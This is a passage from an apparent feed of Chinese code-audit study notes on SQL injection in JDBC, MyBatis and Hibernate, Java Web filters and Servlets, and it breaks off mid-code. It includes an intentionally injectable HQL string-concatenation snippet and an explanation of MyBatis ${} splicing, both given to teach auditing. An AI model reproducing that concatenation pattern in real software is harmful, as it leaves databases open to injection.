where id = ?"</span><span class="token punctuation">;</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">PreparedStatement</span> pstt <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 参数已经强制要求是整型</span>    pstt<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">parseInt</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">ResultSet</span> rs <span class="token operator">=</span> pstt<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>rs<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-框架使用不当造成-SQL-注入"><a href="#0x02-框架使用不当造成-SQL-注入" class="headerlink" title="0x02 框架使用不当造成 SQL 注入"></a>0x02 框架使用不当造成 SQL 注入</h1><p>通常框架底层已经实现了对 SQL 注入的防御，但是如果在开发未能恰当的使用框架的情况下，依然会存在 SQL 注入的风险。</p><h2 id="1、MyBatis-框架"><a href="#1、MyBatis-框架" class="headerlink" title="1、MyBatis 框架"></a>1、MyBatis 框架</h2><p>MyBatis 的思想是将 SQL 语句编入配置文件中，避免 SQL 语句在代码中大量出现，方便对 SQL 语句的修改和配置。</p><p>MyBatis 使用 parameterType 向 SQL 语句传参，在 SQL 引用传参的时候可以使用 #{} 和 ${} 两种方式，两种方式区别如下：</p><p>${}：SQL 拼接符号，直接将输入的语句拼接到 SQL 语句里，想避免 SQL 注入问题需要手动添加过滤</p><p>#{}：占位符号，在对数据解析时会自动将输入的语句前后加上单引号从而避免 SQL 注入</p><p>也就是说在 MyBatis 框架中，如果使用了 ${} 方法，同时又没有进行过滤就会产生 SQL 注入，而使用 #{} 方法时可以避免 SQL 注入。</p><h2 id="2、Hibernate-框架"><a href="#2、Hibernate-框架" class="headerlink" title="2、Hibernate 框架"></a>2、Hibernate 框架</h2><p>Hibernate 是现今主流的 Java 数据库持久化框架，采用 Hibernate 查询语句（HQL）注入。</p><p>HQL 查询语句来自 Hibernate 引擎进行解析，因此产生的错误可能来自数据库，也有可能来自 Hibernate 引擎。 </p><p>HQL 和 SQL 的区别：</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111172027760.png"></p><p>HQL 注入和 SQL 注入的成因都一样，使用拼接 HQL 语句的写法可能会导致 SQL 注入</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Query</span> query <span class="token operator">=</span> session<span class="token punctuation">.</span><span class="token function">createQuery</span><span class="token punctuation">(</span><span class="token string">"from User where name='"</span><span class="token operator">+</span>queryString<span class="token operator">+</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是受语法影响，HQL注入在漏洞利用上有一定的限制，比如不能利用联合查询、不能跨库查表、执行命令等。</p><p>对于 Hibernate 的注入，这里只作为简单了解一下，平时代审的时候注意一下即可。</p><blockquote><p>参考文章：</p><p><a href="https://www.redhatzone.com/ask/article/1448.html">https://www.redhatzone.com/ask/article/1448.html</a></p><p><a href="https://www.redhatzone.com/ask/article/1448.html">https://blog.csdn.net/qq_36594628/article/details/119461996</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-JDBC-拼接不当造成-SQL-注入&quot;&gt;&lt;a href=&quot;#0x01-JDBC-拼接不当造成-SQL-注入&quot; class=&quot;headerlink&quot; title=&quot;0x01 JDBC 拼接不当造成 SQL 注入&quot;&gt;&lt;/a&gt;0x01 JDBC 拼接不当造成 </summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】Java Web 过滤器-filter</title>
    <link href="https://www.teamssix.com/211116-112510.html"/>
    <id>https://www.teamssix.com/211116-112510.html</id>
    <published>2021-11-16T03:25:10.000Z</published>
    <updated>2021-11-22T08:59:50.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>filter 被称为过滤器，是 Servlet 2.3 新增的一个特性，同时也是 Serlvet 技术中最实用的技术。</p><p>过滤器实际上就是对 Web 资源进行拦截，做一些处理后再交给下一个过滤器或 Servlet 处理，通常都是用来拦截 request 进行处理的，也可以对返回的 response 进行拦截处理。</p><p>开发人员利用 filter 技术，可以实现对所有 Web 资源的管理，例如实现权限访问控制、过滤敏感词汇、压缩响应信息等一些高级功能。</p><h1 id="0x01-filter-的配置"><a href="#0x01-filter-的配置" class="headerlink" title="0x01 filter 的配置"></a>0x01 filter 的配置</h1><p>filter 的配置类似于 Servlet，由 filter 和 filter-mapping 两组标签组成，和 Servlet 一样，如果版本大于 3.0 也可以使用注解的方式来配置 filter</p><h2 id="1、基于-web-xml-的配置"><a href="#1、基于-web-xml-的配置" class="headerlink" title="1、基于 web.xml 的配置"></a>1、基于 web.xml 的配置</h2><p>以下是一个基于 web.xml 的配置内容</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/javaee<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd<span class="token punctuation">"</span></span>           <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>manage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file-list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>index.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>index.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file-list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.sec.servlet.UserServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>com.sec.test.test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>标签含义如下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;filter&gt; 指定一个过滤器&lt;filter-name&gt; 为过滤器指定一个名称，该项不能为空&lt;filter-class&gt; 用于指定过滤器的完整的限定类名&lt;init-param&gt; 用于为过滤器指定初始化参数  &lt;param-name&gt; 为 &lt;init-param&gt; 的子参数，用于指定参数的名称  &lt;param-value&gt; 为 &lt;init-param&gt; 的子参数，用于指定参数的值&lt;filter-mapping&gt; 用于设置一个 filter 负责拦截的资源  &lt;filer-name&gt; 为 &lt;filer-mapping&gt; 的子参数，用于设置 filter 的注册名称，该值必须是在 &lt;filter&gt; 元素中声明过的过滤器的名称  &lt;url-pattern&gt; 用于设置 filter 所拦截的请求路径&lt;servlet-name&gt; 用于指定过滤器所拦截的 Servlet 名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、基于注解的方法"><a href="#2、基于注解的方法" class="headerlink" title="2、基于注解的方法"></a>2、基于注解的方法</h2><p>示例代码如下</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token annotation punctuation">@WebFilter</span><span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">"this is filter test"</span><span class="token punctuation">,</span>urlPatterns<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"/filterTest"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> filterTest <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*销毁时调用*/</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> resp<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*过滤方法 主要是对request和response进行一些处理，然后交给下一个过滤器或Servlet处理*/</span>          chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//交给下一个过滤器或servlet处理</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> config<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*初始化方法  接收一个FilterConfig类型的参数 该参数是对Filter的一些配置*/</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>与 Servlet 一样，使用 web.xml 可以配置的 filter 属性也都可以使用注解进行配置，但一般不推荐使用注解配置，因为使用 web.xml 可以控制过滤器的执行顺序，而使用注解的方式则不行。</p><h1 id="0x02-filter-的流程"><a href="#0x02-filter-的流程" class="headerlink" title="0x02 filter 的流程"></a>0x02 filter 的流程</h1><p>filter 的流程很简单，具体如下：</p><pre class="line-numbers language-none"><code class="language-none">用户向服务器发送请求|服务器|filter 1|......|filter n|service()方法|filter n|......|filter 1|服务器|服务器返回结果给用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先用户向服务器发起请求，之后请求经过过滤器到达 Servlet 中的 service() 方法，最后再经过过滤器返回给用户。</p><p>这里值得注意的是过滤器在接收请求和返回请求的时候顺序是相反的。</p><h1 id="0x03-filter-的接口方法"><a href="#0x03-filter-的接口方法" class="headerlink" title="0x03 filter 的接口方法"></a>0x03 filter 的接口方法</h1><p>filter 接口方法如下：</p><h2 id="1、init-接口"><a href="#1、init-接口" class="headerlink" title="1、init() 接口"></a>1、init() 接口</h2><p>该接口与 Servlet 里的 init() 方法类似，主要用来初始化过滤器。如果初始化代码中要用到 FilterConfig 对象，那这些初始化代码只能在 filter 的 init() 方法中编写。</p><p>init() 方法的定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> config<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*初始化方法  接收一个FilterConfig类型的参数 该参数是对Filter的一些配置*/</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="2、doFilter-接口"><a href="#2、doFilter-接口" class="headerlink" title="2、doFilter() 接口"></a>2、doFilter() 接口</h2><p>doFilter 方法类似于 Servlet 接口的 service() 方法，filter 通过该接口实现具体的过滤操作，当客户请求访问与过滤器关联的 URL 的时候，Servlet 过滤器将先执行doFilter 方法，FilterChain 参数用于访问后续过滤器。</p><p>doFilter() 方法定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> resp<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*过滤方法 主要是对request和response进行一些处理，然后交给下一个过滤器或Servlet处理*/</span>          chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//交给下一个过滤器或servlet处理</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、destroy-接口"><a href="#3、destroy-接口" class="headerlink" title="3、destroy() 接口"></a>3、destroy() 接口</h2><p>destroy() 接口和 servlet 里的 destroy() 作用类似，用于释放被 filter 打开的资源，如关闭数据库等。</p><p>destroy() 方法的定义如下：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">/*销毁时调用*/</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="0x04-filter-的生命周期"><a href="#0x04-filter-的生命周期" class="headerlink" title="0x04 filter 的生命周期"></a>0x04 filter 的生命周期</h1><p>filter 的生命周期与 servlet 的生命周期比较类似，如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111161127002.png"></p><p>当 Web 容器启动时，会根据 web.xml 中声明的 filter 顺序依次实例化这些 filter。</p><p>这里会根据实际情况的不同，doFilter() 方法可能会被调用多次，最后当程序关闭或者卸载时调用 destroy() 方法。</p><blockquote><p>参考文章：</p><p><a href="https://blog.csdn.net/Soinice/article/details/82787964">https://blog.csdn.net/Soinice/article/details/82787964</a></p><p><a href="https://www.cnblogs.com/tanghaorong/p/12811457.html">https://www.cnblogs.com/tanghaorong/p/12811457.html</a></p><p><a href="https://blog.csdn.net/yuzhiqiang_1993/article/details/81288912">https://blog.csdn.net/yuzhiqiang_1993/article/details/81288912</a></p><p>更多信息欢迎关注我的个人微信公众号：TeamsSix</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;filter 被称为过滤器，是 Servlet 2.3 新增的一个特性，同时也是 Serlvet 技</summary>
      
    
    
    
    <category term="代码审计" scheme="https://www.teamssix.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="代码审计" scheme="https://www.teamssix.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>【代码审计】Java Web 核心技术-Servlet</title>
    <link href="https://www.teamssix.com/211115-165745.html"/>
    <id>https://www.teamssix.com/211115-165745.html</id>
    <published>2021-11-15T08:57:45.000Z</published>
    <updated>2021-11-22T08:59:50.235Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>Servlet 是 Java Web 容器中运行的小程序，Servlet 原则上可以通过任何客户端-服务端协议进行通信，但它们常与 HTTP 一起使用，因此 Servlet 通常作为 “HTTP Servlet”的简写。</p><p>Servlet 是 Java EE 的核心，也是所有 MVC 框架实现的根本。</p><h1 id="0x01-Servlet-的配置"><a href="#0x01-Servlet-的配置" class="headerlink" title="0x01 Servlet 的配置"></a>0x01 Servlet 的配置</h1><p>版本不同，Servlet 的配置不同，Servlet 3.0 之前的版本都是在 web.xml 中配置的，在 3.0 之后的版本中则使用更为方便的注解方法来配置。</p><p>此外不同版本的 Servlet 所需要的 Java/JDK 版本也不同，具体如下图所示。</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202111151655826.png"></p><h2 id="1、基于-web-xml-的配置"><a href="#1、基于-web-xml-的配置" class="headerlink" title="1、基于 web.xml 的配置"></a>1、基于 web.xml 的配置</h2><p>以下是一个基于 web.xml 的 Servlet 配置文件</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>web-app</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/javaee<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>           <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd<span class="token punctuation">"</span></span>           <span class="token attr-name">version</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2.5<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>manage<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file-list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>index.html<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>welcome-file</span><span class="token punctuation">></span></span>index.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>welcome-file-list</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>display-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>display-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">></span></span>com.sec.servlet.UserServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">></span></span>user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/user<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>web-app</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 web.xml 中，Servlet 的配置在 Servlet 标签中，Servlet 标签由 Servlet 和 Servlet-mapping 标签组成，两者通过标签中相同的 Servlet-name 实现关联，上述配置文件中的标签含义如下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;servlet&gt;声明 Servlet 配置入口&lt;description&gt;声明 Servlet 描述信息&lt;display-name&gt;定义 Web 应用的名称&lt;servlet-name&gt;声明 Servlet 名称以便在后面的映射时使用&lt;servlet-class&gt;指定当前 Servlet 对应的类的路径&lt;servlet-mapping&gt;注册组件访问配置的路径入口&lt;servlet-name&gt;指定上文配置的 Servlet 名称&lt;url-pattern&gt;指定配置这个组件的访问路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、基于注解方式"><a href="#2、基于注解方式" class="headerlink" title="2、基于注解方式"></a>2、基于注解方式</h2><p>Servlet 3.0 以上的版本中，开发者无须在 web.xml 里配置 Servlet，只需要添加 @WebServlet 注解即可修改 Servlet 的属性，如下代码所示。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">WebServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServlet</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletResponse</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">PrintWriter</span><span class="token punctuation">;</span><span class="token comment">/** * 基于注解开发Servlet */</span><span class="token annotation punctuation">@WebServlet</span><span class="token punctuation">(</span>urlPatterns <span class="token operator">=</span> <span class="token string">"/ann.do"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token 